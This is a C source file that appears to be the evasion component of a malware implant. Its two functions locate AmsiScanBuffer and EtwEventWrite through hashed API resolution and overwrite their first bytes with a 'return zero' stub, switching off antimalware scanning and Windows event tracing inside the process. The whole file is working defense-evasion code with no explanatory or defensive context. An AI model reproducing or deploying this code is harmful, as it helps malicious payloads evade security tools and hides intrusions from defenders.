#include "config.h"
#include "common.h"

#ifdef INCLUDE_EVASION_AMSI
VOID patch_amsi(PINSTANCE inst) {
    STK_AMSI(_amsi);
    PVOID amsi = inst->Win32.LoadLibraryA(_amsi);
    if (!amsi) return;

    PVOID scan_buf = resolve_function(amsi, hash_string_djb2(XSTR("AmsiScanBuffer")));
    if (!scan_buf) return;

    BYTE patch[] = { 0x31, 0xC0, 0xC3 };
    DWORD old;
    inst->Win32.VirtualProtect(scan_buf, sizeof(patch), 0x40, &old);
    es_memcpy(scan_buf, patch, sizeof(patch));
    inst->Win32.VirtualProtect(scan_buf, sizeof(patch), old, &old);
}
#endif

#ifdef INCLUDE_EVASION_ETW
VOID patch_etw(PINSTANCE inst) {
    PVOID ntdll = inst->Modules.Ntdll;
    if (!ntdll) return;

    PVOID etw_write = resolve_function(ntdll, hash_string_djb2(XSTR("EtwEventWrite")));
    if (!etw_write) return;

    BYTE patch[] = { 0x31, 0xC0, 0xC3 };
    DWORD old;
    inst->Win32.VirtualProtect(etw_write, sizeof(patch), 0x40, &old);
    es_memcpy(etw_write, patch, sizeof(patch));
    inst->Win32.VirtualProtect(etw_write, sizeof(patch), old, &old);
}
#endif
